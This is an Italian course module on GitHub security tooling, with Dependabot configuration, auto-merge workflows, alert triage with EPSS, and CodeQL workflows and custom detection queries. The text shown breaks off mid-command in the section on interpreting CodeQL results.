---
corso: "GitHub e Git Actions"
fase: "5 — Sicurezza"
modulo: "16"
titolo: "GitHub Security e Scanning"
versione: "GitHub Advanced Security 2024"
livello: "intermedio-avanzato"
prerequisiti:
  - "conoscenza base di GitHub Actions (workflow, job, step)"
  - "familiarita con concetti di sicurezza applicativa (OWASP Top 10)"
  - "esperienza con almeno un linguaggio tra JavaScript, Python, Go, Java"
obiettivi:
  - "configurare Dependabot per aggiornamento automatico delle dipendenze con grouping e auto-merge"
  - "implementare CodeQL per analisi statica del codice con query personalizzate"
  - "abilitare secret scanning e push protection per prevenire leak di credenziali"
  - "generare SBOM e attestazioni SLSA per la supply chain del software"
  - "progettare una pipeline di sicurezza completa che integra piu strumenti di scanning"
tag: [github, security, Dependabot, CodeQL, secret-scanning, push-protection, SBOM, SLSA, SAST, supply-chain]
---

# GitHub Security e Scanning — Guida Approfondita

> **Modulo 16** · **Aggiornamento:** 2026-05-24

> ### Obiettivi di apprendimento
>
> Al termine di questo modulo saprai:
> 1. Configurare Dependabot per aggiornamento automatico delle dipendenze con grouping e auto-merge
> 2. Implementare CodeQL per analisi statica del codice con query personalizzate
> 3. Abilitare secret scanning e push protection per prevenire leak di credenziali
> 4. Generare SBOM e attestazioni SLSA per la supply chain del software
> 5. Progettare una pipeline di sicurezza completa che integra piu strumenti di scanning
>
> **Tempo stimato:** 6-8 ore · **Livello:** Intermedio-Avanzato

## Idee guida
1. **Dependabot per dep updates auto.**
2. **Secret scanning: detect API keys leaked in commit.**
3. **Code scanning (CodeQL): SAST integrato.**
4. **Push protection: blocca commit con secret detected.**


## Indice
- [Panoramica](#panoramica)
- [Architettura della Sicurezza GitHub](#architettura-della-sicurezza-github)
- [Dependabot: Gestione Automatica delle Dipendenze](#dependabot-gestione-automatica-delle-dipendenze)
- [CodeQL: Analisi Statica del Codice](#codeql-analisi-statica-del-codice)
- [Secret Scanning](#secret-scanning)
- [Push Protection — Dettaglio Operativo](#push-protection-dettaglio-operativo)
- [Security Advisories e Private Vulnerability Reporting](#security-advisories-e-private-vulnerability-reporting)
- [Dependency Graph e SBOM](#dependency-graph-e-sbom)
- [Supply Chain Security](#supply-chain-security)
- [Code Scanning con Strumenti di Terze Parti](#code-scanning-con-strumenti-di-terze-parti)
- [GitHub Advanced Security (GHAS) — Licenze e Rollout](#github-advanced-security-ghas-licenze-e-rollout)
- [Automazioni di Sicurezza con GitHub Actions](#automazioni-di-sicurezza-con-github-actions)
- [Security Policy e SECURITY.md](#security-policy-e-securitymd)
- [Best Practices](#best-practices)
- [Troubleshooting](#troubleshooting)
- [Domande Frequenti (FAQ)](#domande-frequenti-faq)
- [Esercizi Pratici](#esercizi-pratici)
- [Riferimenti](#riferimenti)

---

## Panoramica

La sicurezza della supply chain del software è diventata una delle priorità principali nello sviluppo moderno. Attacchi come SolarWinds (2020), Log4Shell (2021), xz-utils backdoor (2024) e il compromesso del pacchetto `colors.js` hanno dimostrato che le dipendenze transitive rappresentano un vettore di attacco estremamente pericoloso. GitHub risponde con un ecosistema completo di strumenti integrati direttamente nella piattaforma:

- **Dependabot** — gestione automatica delle vulnerabilità nelle dipendenze (alert, security updates, version updates)
- **CodeQL** — analisi statica del codice sorgente con query semantiche (SAST)
- **Secret Scanning** — rilevamento di credenziali esposte nei commit
- **Push Protection** — blocco preventivo di push contenenti segreti
- **Dependency Graph + SBOM** — visibilità completa sulle dipendenze dirette e transitive
- **Supply Chain Security** — Sigstore, SLSA, artifact attestations

Ogni strumento è progettato per integrarsi nel flusso di lavoro esistente senza richiedere cambiamenti radicali nel processo di sviluppo. L'obiettivo è "shift left": intercettare le vulnerabilità il prima possibile, idealmente prima che il codice raggiunga il branch principale.

### Gratuito vs. GHAS

| Funzionalità | Repository pubblici | Repository privati (Free/Team) | Repository privati (GHAS) |
|---|---|---|---|
| Dependabot alerts | Sì | Sì | Sì |
| Dependabot security updates | Sì | Sì | Sì |
| Dependabot version updates | Sì | Sì | Sì |
| Dependency graph | Sì | Sì | Sì |
| Secret scanning alerts | Sì | No | Sì |
| Push protection | Sì | No | Sì |
| CodeQL code scanning | Sì | No | Sì |
| Custom CodeQL queries | Sì | No | Sì |
| Custom secret patterns | Sì | No | Sì |
| Security overview dashboard | No | No | Sì |

---

## Architettura della Sicurezza GitHub

### Layer di Difesa

```
┌──────────────────────────────────────────────┐
│  Layer 1 — Pre-commit (Developer Workstation) │
│  • git hooks (detect-secrets, gitleaks)        │
│  • IDE CodeQL extension                        │
│  • .gitignore per file sensibili               │
├──────────────────────────────────────────────┤
│  Layer 2 — Push Protection (Server-side)       │
│  • Secret scanning push protection             │
│  • Blocco token/chiavi rilevati                │
├──────────────────────────────────────────────┤
│  Layer 3 — PR Checks (CI Pipeline)             │
│  • CodeQL analysis                             │
│  • Dependabot alerts                           │
│  • Strumenti terze parti (Trivy, Semgrep)      │
│  • Branch protection rules                     │
├──────────────────────────────────────────────┤
│  Layer 4 — Continuous Monitoring               │
│  • Dependabot version updates                  │
│  • Scheduled CodeQL scans                      │
│  • Secret scanning retroattivo                 │
│  • Advisory database updates                   │
├──────────────────────────────────────────────┤
│  Layer 5 — Incident Response                   │
│  • Security advisories                         │
│  • Private vulnerability reporting             │
│  • Automated secret revocation                 │
└──────────────────────────────────────────────┘
```

### Security Overview (Organizzazione)

Per le organizzazioni con GHAS, la Security Overview fornisce una dashboard centralizzata:

```bash
# Accedere alla security overview via API
gh api orgs/{org}/code-scanning/alerts \
  --jq '.[] | {repo: .repository.name, rule: .rule.id, severity: .rule.severity}'

# Contare gli alert aperti per severità
gh api orgs/{org}/dependabot/alerts \
  --jq 'group_by(.security_advisory.severity) | map({severity: .[0].security_advisory.severity, count: length})'
```

La dashboard mostra:
- **Coverage** — Percentuale di repository con scanning abilitato
- **Risk** — Repository con alert critici non risolti
- **Alert trends** — Trend temporale degli alert aperti/chiusi

---

## Dependabot: Gestione Automatica delle Dipendenze

### Dependabot Alerts

Dependabot monitora le dipendenze del progetto e crea alert quando viene scoperta una vulnerabilità. Si basa sul **GitHub Advisory Database** (curato manualmente dal team GitHub + contributi community) e sul **National Vulnerability Database** (NVD). GitHub correla le advisory con il dependency graph del repository per determinare se una versione vulnerabile è effettivamente usata.

```bash
# Visualizzare gli alert di Dependabot
gh api repos/{owner}/{repo}/dependabot/alerts \
  --jq '.[] | {number, state, package: .security_vulnerability.package.name, severity: .security_advisory.severity}'

# Filtrare per severità
gh api repos/{owner}/{repo}/dependabot/alerts?severity=critical \
  --jq '.[] | {number, package: .security_vulnerability.package.name, cve: .security_advisory.cve_id}'

# Dismissare un alert
gh api repos/{owner}/{repo}/dependabot/alerts/1 -X PATCH \
  -f state="dismissed" \
  -f dismissed_reason="tolerable_risk" \
  -f dismissed_comment="Funzionalità vulnerabile non usata nel nostro codice — verificato con grep"

# Motivi di dismissal:
# fix_started — Fix in corso
# inaccurate — Alert non accurato
# no_bandwidth — Non prioritario al momento
# not_used — Funzionalità vulnerabile non usata
# tolerable_risk — Rischio accettabile
```

### Come GitHub Determina la Versione Vulnerabile

1. **Parsing del manifest** — Legge `package.json`, `requirements.txt`, `go.mod`, `Gemfile.lock`, ecc.
2. **Dependency graph** — Costruisce il grafo completo delle dipendenze dirette e transitive
3. **Matching advisory** — Confronta ogni dipendenza con le advisory nel database
4. **Reachability analysis** — Per alcuni ecosistemi (npm, pip), verifica se il codice vulnerabile è effettivamente raggiungibile

### Dependabot Security Updates

Le security updates creano automaticamente PR per aggiornare le dipendenze vulnerabili alla **versione minima sicura** — cioè la patch più piccola che elimina la vulnerabilità senza introdurre breaking changes.

```bash
# Abilitare le security updates
gh api repos/{owner}/{repo} -X PATCH \
  -F security_and_analysis[dependabot_security_updates][status]="enabled"

# Le PR generate:
# - Contengono un titolo del tipo "Bump express from 4.17.1 to 4.18.2"
# - Includono release notes, changelog e commit diff della dipendenza
# - Mostrano il compatibility score basato sui test CI di altri repository
# - Vengono create solo per dipendenze dirette (default) o anche transitive (configurabile)
```

### Dependabot Version Updates

Le version updates mantengono le dipendenze aggiornate **anche in assenza di vulnerabilità note**. Si configurano tramite `.github/dependabot.yml`. Questo è fondamentale perché molte CVE vengono scoperte dopo mesi dalla release della versione vulnerabile — aggiornare proattivamente riduce la finestra di esposizione.

```yaml
# .github/dependabot.yml
version: 2

registries:
  npm-github:
    type: npm-registry
    url: https://npm.pkg.github.com
    token: ${{ secrets.NPM_TOKEN }}
  maven-central:
    type: maven-repository
    url: https://repo.maven.apache.org/maven2
  pypi-internal:
    type: python-index
    url: https://pypi.internal.company.com/simple
    token: ${{ secrets.PYPI_TOKEN }}
    replaces-base: false

updates:
  # npm dependencies
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
      day: "monday"
      time: "09:00"
      timezone: "Europe/Rome"
    open-pull-requests-limit: 10
    reviewers:
      - "frontend-team"
    assignees:
      - "tech-lead"
    labels:
      - "dependencies"
      - "automated"
    commit-message:
      prefix: "chore"
      prefix-development: "chore"
      include: "scope"
    versioning-strategy: increase
    allow:
      - dependency-type: "direct"
    ignore:
      - dependency-name: "typescript"
        versions: [">=6.0.0"]    # Ignorare major updates
      - dependency-name: "@types/*"
        update-types: ["version-update:semver-patch"]
    groups:
      dev-dependencies:
        patterns:
          - "@types/*"
          - "eslint*"
          - "prettier*"
          - "jest*"
        update-types:
          - "minor"
          - "patch"
      production-deps:
        patterns:
          - "express*"
          - "react*"
        update-types:
          - "patch"

  # Python dependencies
  - package-ecosystem: "pip"
    directory: "/backend"
    schedule:
      interval: "weekly"
    allow:
      - dependency-type: "direct"
    groups:
      testing:
        patterns:
          - "pytest*"
          - "coverage*"
      ml-libs:
        patterns:
          - "numpy*"
          - "pandas*"
          - "scikit*"

  # Docker base images
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
    reviewers:
      - "devops-team"
    labels:
      - "docker"
      - "dependencies"

  # GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    labels:
      - "ci"
      - "dependencies"
    groups:
      actions:
        patterns:
          - "actions/*"

  # Terraform providers
  - package-ecosystem: "terraform"
    directory: "/infrastructure"
    schedule:
      interval: "monthly"
    reviewers:
      - "infra-team"

  # Go modules
  - package-ecosystem: "gomod"
    directory: "/"
    schedule:
      interval: "weekly"

  # Maven/Gradle
  - package-ecosystem: "maven"
    directory: "/"
    schedule:
      interval: "weekly"
    registries:
      - maven-central

  # NuGet (.NET)
  - package-ecosystem: "nuget"
    directory: "/dotnet-service"
    schedule:
      interval: "weekly"

  # Bundler (Ruby)
  - package-ecosystem: "bundler"
    directory: "/ruby-service"
    schedule:
      interval: "weekly"

  # Cargo (Rust)
  - package-ecosystem: "cargo"
    directory: "/rust-service"
    schedule:
      interval: "weekly"

  # Composer (PHP)
  - package-ecosystem: "composer"
    directory: "/php-service"
    schedule:
      interval: "weekly"
```

### Strategie di Versioning

| Strategia | Descrizione | Quando usarla |
|-----------|-------------|---------------|
| `increase` | Incrementa la versione nel manifest | Default per la maggior parte dei progetti |
| `increase-if-necessary` | Incrementa solo se il lockfile lo richiede | Quando il lockfile è la fonte di verità |
| `lockfile-only` | Aggiorna solo il lockfile | Per applicazioni che non toccano il manifest |
| `widen` | Amplia il range di versioni | Per librerie che pubblicano package |
| `auto` | Dependabot sceglie la strategia migliore | Quando non si è certi |

### Ecosistemi Supportati

| Ecosistema | File analizzato | Lockfile |
|---|---|---|
| npm | `package.json` | `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml` |
| pip | `requirements.txt`, `setup.py`, `Pipfile` | `Pipfile.lock` |
| Maven | `pom.xml` | — |
| Gradle | `build.gradle`, `build.gradle.kts` | — |
| NuGet | `*.csproj`, `packages.config` | `packages.lock.json` |
| Bundler | `Gemfile` | `Gemfile.lock` |
| Cargo | `Cargo.toml` | `Cargo.lock` |
| Composer | `composer.json` | `composer.lock` |
| Go modules | `go.mod` | `go.sum` |
| Docker | `Dockerfile` | — |
| Terraform | `*.tf` | `.terraform.lock.hcl` |
| GitHub Actions | `*.yml` in `.github/workflows/` | — |
| Pub (Dart/Flutter) | `pubspec.yaml` | `pubspec.lock` |
| Hex (Elixir) | `mix.exs` | `mix.lock` |
| Swift PM | `Package.swift` | `Package.resolved` |

### Auto-merge per Dependabot PR

```yaml
# .github/workflows/dependabot-auto-merge.yml
name: Dependabot Auto-Merge

on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write

jobs:
  auto-merge:
    runs-on: ubuntu-latest
    if: github.actor == 'dependabot[bot]'
    steps:
      - name: Fetch Dependabot metadata
        id: metadata
        uses: dependabot/fetch-metadata@v2
        with:
          github-token: "${{ secrets.GITHUB_TOKEN }}"

      # Auto-merge solo per patch e minor updates di dev dependencies
      - name: Auto-merge patch/minor dev deps
        if: >
          steps.metadata.outputs.update-type != 'version-update:semver-major' &&
          steps.metadata.outputs.dependency-type == 'direct:development'
        run: gh pr merge --auto --squash "$PR_URL"
        env:
          PR_URL: ${{ github.event.pull_request.html_url }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # Auto-merge per patch di production deps (dopo che CI passa)
      - name: Auto-merge patch production deps
        if: >
          steps.metadata.outputs.update-type == 'version-update:semver-patch' &&
          steps.metadata.outputs.dependency-type == 'direct:production'
        run: gh pr merge --auto --squash "$PR_URL"
        env:
          PR_URL: ${{ github.event.pull_request.html_url }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}

      # Approvare automaticamente patch e minor
      - name: Auto-approve
        if: steps.metadata.outputs.update-type != 'version-update:semver-major'
        run: gh pr review --approve "$PR_URL"
        env:
          PR_URL: ${{ github.event.pull_request.html_url }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

### Grouped Security Updates

A partire dal 2024, Dependabot supporta gli aggiornamenti di sicurezza raggruppati:

```yaml
# In dependabot.yml — le security updates ereditano i groups definiti
# Esempio: tutte le vulnerabilità npm vengono raggruppate in una singola PR

# Comportamento:
# 1. Se una dipendenza ha una vulnerabilità, Dependabot la aggiorna
# 2. Se più dipendenze nello stesso group sono vulnerabili, una singola PR le aggiorna tutte
# 3. Le security updates hanno priorità maggiore delle version updates
```

### Auto-Triage Rules per Dependabot

Le auto-triage rules consentono di definire criteri personalizzati per la gestione automatica degli alert. Questa funzionalita riduce drasticamente l'"alert fatigue" — il fenomeno per cui un numero eccessivo di notifiche porta gli sviluppatori a ignorarle tutte, incluse quelle critiche.

#### Preset curati da GitHub

GitHub offre preset gratuiti per tutti i repository:

```
GitHub Preset: Dismiss low impact alerts for development-scoped dependencies
  → Dismisses automaticamente alert che soddisfano TUTTE queste condizioni:
    - La vulnerabilità non ha un CVE noto
    - La dipendenza è usata solo in ambito development (devDependencies, test scope)
    - La severity è low o moderate
    - Il CVSS score è < 4.0

Questo preset da solo può ridurre il volume di alert del 15-30% senza rischio apprezzabile.
```

#### Custom Auto-Triage Rules

Per repository privati con GitHub Advanced Security (o pubblici gratuitamente), è possibile creare regole personalizzate:

```bash
# Struttura concettuale di una auto-triage rule
# Ogni regola specifica:
#   - target_alerts: quali alert matchare
#   - action: dismiss, reopen, o snooze_until_patch
#   - reason: motivazione per l'azione

# Esempio: dismissare alert per dipendenze non usate in produzione
# Target: ecosystem=npm, scope=development, severity=low|moderate
# Action: dismiss
# Reason: "Dependency not used in production builds"

# Esempio: dismissare alert con EPSS < 0.1% (probabilità di exploit molto bassa)
# Target: epss_percentage < 0.001
# Action: dismiss
# Reason: "Extremely low exploitation probability"

# Esempio: snooze alert senza patch disponibile
# Target: has_patch=false
# Action: snooze_until_patch
# Reason: "No fix available yet, will reopen when patch is released"
```

I criteri disponibili per il targeting degli alert includono:

| Criterio | Descrizione | Esempio |
|----------|-------------|---------|
| `severity` | Gravità della vulnerabilità | `critical`, `high`, `moderate`, `low` |
| `scope` | Ambito della dipendenza | `development`, `runtime` |
| `ecosystem` | Ecosistema del package manager | `npm`, `pip`, `maven`, `cargo` |
| `package-name` | Nome specifico del pacchetto | `lodash`, `express`, `requests` |
| `cve-id` | Identificativo CVE specifico | `CVE-2024-12345` |
| `cwes` | CWE category | `CWE-79` (XSS), `CWE-89` (SQLi) |
| `epss_percentage` | Score EPSS (probabilità di exploit) | `0.0` - `1.0` |
| `manifest` | File manifest specifico | `package.json`, `requirements.txt` |

#### EPSS (Exploit Prediction Scoring System) in Dependabot

A partire da febbraio 2025, Dependabot integra nativamente gli score EPSS del FIRST (Forum of Incident Response and Security Teams). EPSS stima la probabilità che una vulnerabilità venga sfruttata nei prossimi 30 giorni, su una scala da 0.0 (0%) a 1.0 (100%).

Dati statistici chiave sull'EPSS:

```
Distribuzione tipica degli score EPSS:
  - ~95% delle CVE hanno un EPSS < 10% (bassa probabilità di exploit)
  - ~2-3% delle CVE hanno un EPSS tra 10% e 50%
  - Solo ~0.5% delle CVE hanno un EPSS > 50% (alta probabilità di exploit)

Combinazione CVSS + EPSS per prioritizzazione:
  ┌─────────────┬────────────────┬──────────────────────────────┐
  │ CVSS Score   │ EPSS Score     │ Priorità                     │
  ├─────────────┼────────────────┼──────────────────────────────┤
  │ 9.0+ (Crit) │ > 50%          │ CRITICA — Fix immediato      │
  │ 9.0+ (Crit) │ < 10%          │ ALTA — Fix entro 1 settimana │
  │ 7.0-8.9     │ > 50%          │ ALTA — Fix entro 1 settimana │
  │ 7.0-8.9     │ < 10%          │ MEDIA — Fix entro 1 mese     │
  │ 4.0-6.9     │ < 10%          │ BASSA — Fix nel prossimo     │
  │             │                │ ciclo di manutenzione        │
  │ < 4.0       │ < 1%           │ MINIMA — Monitorare          │
  └─────────────┴────────────────┴──────────────────────────────┘

Perché usare EPSS oltre al CVSS:
  - CVSS misura la GRAVITÀ potenziale (quanto danno PUÒ fare)
  - EPSS misura la PROBABILITÀ di exploit (quanto è PROBABILE che venga sfruttata)
  - Una CVE con CVSS 9.8 ma EPSS 0.01% è teoricamente grave
    ma praticamente improbabile da sfruttare
  - Una CVE con CVSS 6.5 ma EPSS 85% è moderata in teoria
    ma quasi certamente verrà sfruttata nella pratica
```

```bash
# Visualizzare alert con EPSS score via API
gh api repos/{owner}/{repo}/dependabot/alerts \
  --jq '.[] | select(.security_advisory.epss != null) | {
    number,
    package: .security_vulnerability.package.name,
    severity: .security_advisory.severity,
    cvss: .security_advisory.cvss.score,
    epss: .security_advisory.epss.percentage,
    epss_percentile: .security_advisory.epss.percentile
  }'

# Filtrare per alert ad alta probabilità di exploit
gh api repos/{owner}/{repo}/dependabot/alerts \
  --jq '.[] | select(.security_advisory.epss.percentage > 0.5) | {
    number,
    package: .security_vulnerability.package.name,
    epss: .security_advisory.epss.percentage
  }'
```

### Dependabot per Monorepo e Multi-Directory

Per progetti con struttura monorepo, Dependabot supporta la scansione di directory multiple con configurazioni indipendenti:

```yaml
# .github/dependabot.yml — Configurazione monorepo
version: 2

updates:
  # Frontend React
  - package-ecosystem: "npm"
    directory: "/packages/frontend"
    schedule:
      interval: "weekly"
      day: "tuesday"
    groups:
      react-ecosystem:
        patterns:
          - "react*"
          - "@tanstack/*"
          - "next*"
        update-types: ["minor", "patch"]
      testing:
        patterns:
          - "@testing-library/*"
          - "vitest*"
          - "playwright*"

  # Backend API (Python)
  - package-ecosystem: "pip"
    directory: "/packages/api"
    schedule:
      interval: "weekly"
      day: "tuesday"
    groups:
      fastapi-stack:
        patterns:
          - "fastapi*"
          - "uvicorn*"
          - "pydantic*"
      database:
        patterns:
          - "sqlalchemy*"
          - "alembic*"
          - "asyncpg*"

  # Servizio Go
  - package-ecosystem: "gomod"
    directory: "/packages/worker"
    schedule:
      interval: "weekly"
      day: "tuesday"

  # Infrastructure (Terraform)
  - package-ecosystem: "terraform"
    directory: "/infrastructure/production"
    schedule:
      interval: "monthly"
    reviewers:
      - "platform-team"

  - package-ecosystem: "terraform"
    directory: "/infrastructure/staging"
    schedule:
      interval: "monthly"
    reviewers:
      - "platform-team"

  # Shared libraries
  - package-ecosystem: "npm"
    directory: "/packages/shared-utils"
    schedule:
      interval: "weekly"

  # Root-level GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
    groups:
      all-actions:
        patterns: ["*"]
```

### Dependabot e Registri Privati

Per dipendenze ospitate su registri privati (Artifactory, Nexus, GitHub Packages, registri aziendali), è necessario configurare i registri in `dependabot.yml`:

```yaml
version: 2

registries:
  # GitHub Packages (npm)
  github-npm:
    type: npm-registry
    url: https://npm.pkg.github.com
    token: ${{ secrets.GH_PACKAGES_TOKEN }}

  # Artifactory (Maven)
  artifactory-maven:
    type: maven-repository
    url: https://artifactory.company.com/maven-releases
    username: ${{ secrets.ARTIFACTORY_USER }}
    password: ${{ secrets.ARTIFACTORY_PASS }}

  # PyPI privato
  internal-pypi:
    type: python-index
    url: https://pypi.internal.company.com/simple
    token: ${{ secrets.PYPI_INTERNAL_TOKEN }}
    replaces-base: false  # false = usa ANCHE PyPI pubblico

  # Docker registry privato
  ecr:
    type: docker-registry
    url: https://123456789.dkr.ecr.us-east-1.amazonaws.com
    username: ${{ secrets.AWS_ACCESS_KEY_ID }}
    password: ${{ secrets.AWS_SECRET_ACCESS_KEY }}

  # Terraform registry privato
  terraform-private:
    type: terraform-registry
    url: https://terraform.company.com
    token: ${{ secrets.TERRAFORM_TOKEN }}

  # NuGet privato
  nuget-internal:
    type: nuget-feed
    url: https://nuget.internal.company.com/v3/index.json
    token: ${{ secrets.NUGET_TOKEN }}

  # Hex (Elixir) privato
  hex-internal:
    type: hex-organization
    organization: my-company
    key: ${{ secrets.HEX_KEY }}

updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    registries:
      - github-npm  # Referenza al registro definito sopra

  - package-ecosystem: "maven"
    directory: "/"
    schedule:
      interval: "weekly"
    registries:
      - artifactory-maven

  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
    registries:
      - internal-pypi
```

---

## CodeQL: Analisi Statica del Codice

### Cos'è CodeQL

CodeQL è il motore di analisi statica di GitHub che tratta il codice come **dati interrogabili**. Il processo:

1. **Estrazione** — CodeQL crea un database relazionale dal codice sorgente, catturando l'AST (Abstract Syntax Tree), il flusso di dati, il flusso di controllo e le relazioni tra entità
2. **Analisi** — Le query QL vengono eseguite sul database per trovare pattern di vulnerabilità
3. **Risultati** — I risultati vengono pubblicati come alert nel tab Security del repository in formato SARIF

Il vantaggio rispetto a tool come ESLint o Pylint è la **capacità di tracciare il flusso di dati** (taint tracking): CodeQL può seguire un input utente dalla sorgente (es. `req.query`) fino al sink (es. `db.query()`) attraverso chiamate di funzione, assegnamenti e trasformazioni.

### Linguaggi Supportati

| Linguaggio | Supporto | Note |
|-----------|----------|------|
| JavaScript/TypeScript | Completo | Include flow analysis, DOM model |
| Python | Completo | Django, Flask, FastAPI model |
| Java/Kotlin | Completo | Spring, Hibernate model |
| C/C++ | Completo | Richiede compilazione |
| C# | Completo | .NET, ASP.NET model |
| Go | Completo | net/http, gin, echo model |
| Ruby | Completo | Rails model |
| Swift | GA (2024) | iOS/macOS analysis |
| Kotlin | GA (via Java) | Android analysis |

### Configurazione di Base

```yaml
# .github/workflows/codeql.yml
name: CodeQL Analysis

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 6 * * 1'  # Ogni lunedì alle 6:00

jobs:
  analyze:
    name: Analyze (${{ matrix.language }})
    runs-on: ${{ matrix.language == 'swift' && 'macos-latest' || 'ubuntu-latest' }}
    timeout-minutes: ${{ matrix.language == 'swift' && 120 || 360 }}
    permissions:
      security-events: write
      actions: read
      contents: read

    strategy:
      fail-fast: false
      matrix:
        language: ['javascript-typescript', 'python']
        # Nomi aggiornati (2024+):
        # javascript-typescript (era: javascript)
        # java-kotlin (era: java)
        # csharp
        # cpp
        # go
        # python
        # ruby
        # swift

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v3
        with:
          languages: ${{ matrix.language }}
          queries: +security-extended,security-and-quality
          # Suite disponibili:
          # - default: query di sicurezza standard
          # - security-extended: default + query aggiuntive a precision più bassa
          # - security-and-quality: security-extended + code quality queries

      # Per linguaggi compilati (C/C++, Java, C#, Go, Swift):
      # Autobuild tenta di compilare automaticamente
      - name: Autobuild
        uses: github/codeql-action/autobuild@v3
        # Se autobuild fallisce, specificare i comandi di build:
        # - name: Build manually
        #   run: |
        #     mvn clean package -DskipTests
        #     # oppure: dotnet build --configuration Release
        #     # oppure: make all

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v3
        with:
          category: "/language:${{ matrix.language }}"
          # upload: true (default) — pubblica i risultati
          # output: sarif-results — salva il SARIF localmente
```

### Configurazione Avanzata con codeql-config.yml

```yaml
# .github/codeql/codeql-config.yml
name: "Custom CodeQL Config"

queries:
  - uses: security-extended
  - uses: security-and-quality
  - uses: ./custom-queries  # Query personalizzate nel repository

packs:
  javascript-typescript:
    - codeql/javascript-queries
    - my-org/custom-js-queries@1.0.0  # Pack personalizzato dal registry
  python:
    - codeql/python-queries
  java-kotlin:
    - codeql/java-queries

paths-ignore:
  - node_modules
  - '**/test/**'
  - '**/tests/**'
  - '**/vendor/**'
  - '**/*.test.js'
  - '**/*.spec.ts'
  - '**/migrations/**'
  - '**/fixtures/**'

paths:
  - src
  - lib
  - app

query-filters:
  - exclude:
      id: js/unused-local-variable
  - exclude:
      tags contain: /maintainability/
  - include:
      id:
        - js/sql-injection
        - js/xss
        - js/path-injection

# Threat model configuration (2024+)
threat-models:
  - remote    # Input da rete (HTTP, WebSocket, gRPC)
  - local     # Input locali (file, stdin, env vars)
  # - environment  # Variabili d'ambiente come source (opt-in)
```

### Query Personalizzate CodeQL — Esempi

#### SQL Injection (JavaScript)

```ql
/**
 * @name SQL injection from user input
 * @description Finds SQL queries built from user-controlled input
 * @kind path-problem
 * @problem.severity error
 * @security-severity 9.8
 * @precision high
 * @id custom/sql-injection
 * @tags security
 *       external/cwe/cwe-089
 */

import javascript
import DataFlow::PathGraph

class SqlInjectionConfig extends TaintTracking::Configuration {
    SqlInjectionConfig() { this = "SqlInjectionConfig" }

    override predicate isSource(DataFlow::Node source) {
        exists(Express::RequestExpr req |
            source.asExpr() = req.getAPropertyRead(["query", "body", "params"]).getAPropertyRead()
        )
    }

    override predicate isSink(DataFlow::Node sink) {
        exists(DatabaseAccess da |
            sink.asExpr() = da.getAQueryArgument()
        )
    }
}

from SqlInjectionConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
where config.hasFlowPath(source, sink)
select sink.getNode(), source, sink, "SQL injection from $@.", source.getNode(), "user input"
```

#### Hardcoded Password (Python)

```ql
/**
 * @name Hardcoded password in source
 * @description Finds password-like strings assigned to variables named 'password', 'secret', etc.
 * @kind problem
 * @problem.severity warning
 * @security-severity 7.5
 * @precision medium
 * @id custom/hardcoded-password
 * @tags security
 *       external/cwe/cwe-798
 */

import python

from AssignStmt assign, StrConst str
where
  assign.getATarget().(Name).getId().regexpMatch("(?i).*(password|secret|token|api_key|apikey).*") and
  str = assign.getValue() and
  str.getText().length() > 3 and
  not str.getText().regexpMatch("(?i)(test|example|placeholder|dummy|xxx|changeme).*")
select assign, "Hardcoded credential found in variable '" + assign.getATarget().(Name).getId() + "'"
```

#### Insecure Deserialization (Java)

```ql
/**
 * @name Unsafe deserialization of user input
 * @description Deserializing untrusted data can lead to remote code execution
 * @kind path-problem
 * @problem.severity error
 * @security-severity 9.0
 * @id custom/unsafe-deserialization
 * @tags security
 *       external/cwe/cwe-502
 */

import java
import semmle.code.java.dataflow.TaintTracking
import DataFlow::PathGraph

class UnsafeDeserializationConfig extends TaintTracking::Configuration {
    UnsafeDeserializationConfig() { this = "UnsafeDeserializationConfig" }

    override predicate isSource(DataFlow::Node source) {
        exists(MethodCall mc |
            mc.getMethod().hasName("getInputStream") and
            source.asExpr() = mc
        )
    }

    override predicate isSink(DataFlow::Node sink) {
        exists(MethodCall mc |
            mc.getMethod().hasName("readObject") and
            mc.getMethod().getDeclaringType().hasQualifiedName("java.io", "ObjectInputStream") and
            sink.asExpr() = mc.getQualifier()
        )
    }
}

from UnsafeDeserializationConfig config, DataFlow::PathNode source, DataFlow::PathNode sink
where config.hasFlowPath(source, sink)
select sink.getNode(), source, sink, "Unsafe deserialization of $@.", source.getNode(), "untrusted input"
```

### CodeQL per Linguaggi Compilati

Per C/C++, Java, C#, Go e Swift, CodeQL deve **compilare il codice** per creare il database. Se `autobuild` fallisce:

```yaml
# Java con Maven
- name: Build with Maven
  run: mvn clean compile -DskipTests -B

# .NET con dotnet
- name: Build with dotnet
  run: dotnet build Solution.sln --configuration Release --no-restore

# C/C++ con CMake
- name: Build with CMake
  run: |
    mkdir build && cd build
    cmake ..
    make -j$(nproc)

# Go
- name: Build Go
  run: go build ./...

# Swift (richiede macOS runner)
- name: Build Swift
  run: swift build
```

### Interpretare i Risultati CodeQL

I risultati CodeQL sono categorizzati per:

- **Severity**: error, warning, note, recommendation
- **Security severity score**: 0.0-10.0 (basato su CVSS)
- **Precision**: high, medium, low (probabilità che sia un vero positivo)
- **Tags**: cwe-xxx, security, correctness, maintainability

```bash
# Visualizzare i risultati CodeQL via CLI
gh api repos/{owner}/{repo}/code-scanning/alerts \
  --jq '.[] | {number, rule: .rule.id, severity: .rule.security_severity_level, state, tool: .tool.name}'

# Filtrare per severità
gh api repos/{owner}/{repo}/code-scanning/alerts?severity=critical \
  --jq '.[] | {number, rule: .rule.id, description: .rule.description}'

# Dismissare un alert
gh api repos/{owner}/{repo}/code-scanning/alerts/42 -X PATCH \
  -f state="dismissed" \
  -f dismissed_reason="false positive" \
